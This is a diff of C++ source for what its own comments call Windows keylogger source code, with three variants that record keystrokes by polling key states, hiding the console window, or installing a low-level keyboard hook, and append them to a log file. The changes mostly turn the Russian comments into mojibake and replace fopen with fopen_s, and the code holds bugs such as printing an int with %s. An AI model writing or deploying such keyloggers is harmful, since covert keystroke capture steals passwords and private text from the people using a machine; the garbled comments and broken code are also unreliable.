@@ -6,16 +6,16 @@
 using namespace std;
 int main()
 {
-	ofstream File; //созд. ф-л
-	File.open("log.txt");//отк. и обозначить
-	FreeConsole();// сделать не видимой
-	string log = ""; // строков. переменные
+	ofstream File; //СЃРѕР·Рґ. С„-Р»
+	File.open("log.txt");//РѕС‚Рє. Рё РѕР±РѕР·РЅР°С‡РёС‚СЊ
+	FreeConsole();// СЃРґРµР»Р°С‚СЊ РЅРµ РІРёРґРёРјРѕР№
+	string log = ""; // СЃС‚СЂРѕРєРѕРІ. РїРµСЂРµРјРµРЅРЅС‹Рµ
 	string letter = "";
 	int num = 0;
 
-	while (1)// включенный цикл
+	while (1)// РІРєР»СЋС‡РµРЅРЅС‹Р№ С†РёРєР»
 	{
-		for (num = 32; num <= 90; num++)// чаво 32? 
+		for (num = 32; num <= 90; num++)// С‡Р°РІРѕ 32? 
 		{
 			switch (num)
 			{
@@ -47,7 +47,7 @@ int main()
 			case 90: letter = "z"; break;
 			case 32: letter = " "; break;
 			}
-			if (GetAsyncKeyState(num))//уточнить что делает функция 
+			if (GetAsyncKeyState(num))//СѓС‚РѕС‡РЅРёС‚СЊ С‡С‚Рѕ РґРµР»Р°РµС‚ С„СѓРЅРєС†РёСЏ 
 			{
 				log += letter;
 				Sleep(200);
@@ -80,7 +80,8 @@ int S(int key, char *files)
 		return 0;
 
 	FILE *Save;
-	Save = fopen(files, "a+");
+	//Save = fopen(files, "a+");
+	fopen_s(&Save, files, "a+");
 	cout << key << endl;
 	fprintf(Save, "%s", &key);
 	fclose(Save);
@@ -106,7 +107,10 @@ int main()
 		for (q = 8; q <= 190; q++)
 		{
 			if (GetAsyncKeyState(q) == -32767)
-				S(q, "log.txt");
+			{
+				char * chlog = "log.txt";
+				S(q, chlog);
+			}
 			else {
 				a++;
 				if (a == 15)
@@ -143,7 +147,7 @@ HHOOK keyboardHook;
 char keyNameBuff[16];
 PKBDLLHOOKSTRUCT p;
 unsigned int sc;
-//кейлоггер для Windows
+//РєРµР№Р»РѕРіРіРµСЂ РґР»СЏ Windows
 void writeToLog(string s) //write a string to the log
 {
 	ofstream log(logName, ios::app); //opens log file
@@ -152,7 +156,7 @@ void writeToLog(string s) //write a string to the log
 
 	log.close(); //closes log
 }
-// Кейлоггер для Windows
+// РљРµР№Р»РѕРіРіРµСЂ РґР»СЏ Windows
 BOOL isCaps()
 {
 	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ||
@@ -163,7 +167,7 @@ BOOL isCaps()
 		return 0;
 	}
 }
-// Кейлоггер для Windows
+// РљРµР№Р»РѕРіРіРµСЂ РґР»СЏ Windows
 LRESULT CALLBACK hookProc(int nCode, WPARAM wParam, LPARAM lParam)//proc to be run on hooked key
 {
 	if (wParam == WM_KEYDOWN)//if key event type is key down
@@ -180,7 +184,7 @@ LRESULT CALLBACK hookProc(int nCode, WPARAM wParam, LPARAM lParam)//proc to be r
 		}
 
 		GetKeyNameTextA(sc, keyNameBuff, 16);
-		// Кейлоггер для Windows - исходник 
+		// РљРµР№Р»РѕРіРіРµСЂ РґР»СЏ Windows - РёСЃС…РѕРґРЅРёРє 
 		//gets ASCII key name from sc into keyNameBuff
 
 		//write keyname to log
@@ -235,7 +239,7 @@ LRESULT CALLBACK hookProc(int nCode, WPARAM wParam, LPARAM lParam)//proc to be r
 	}
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
-// Кейлоггер для Windows
+// РљРµР№Р»РѕРіРіРµСЂ РґР»СЏ Windows
 void msgLoop()
 {
 	while (GetMessage(&message, NULL, 0, 0))
@@ -244,7 +248,7 @@ void msgLoop()
 		DispatchMessage(&message);
 	}
 }
-// Кейлоггер для Windows
+// РљРµР№Р»РѕРіРіРµСЂ РґР»СЏ Windows
 //int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
@@ -252,7 +256,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		hookProc, hInstance, 0); //hooks keyboard
 
 	msgLoop(); //stops from closing
-			   // Кейлоггер для Windows - исходник
+			   // РљРµР№Р»РѕРіРіРµСЂ РґР»СЏ Windows - РёСЃС…РѕРґРЅРёРє
 	UnhookWindowsHookEx(keyboardHook); //unhooks
 
 	return 0; //Never run
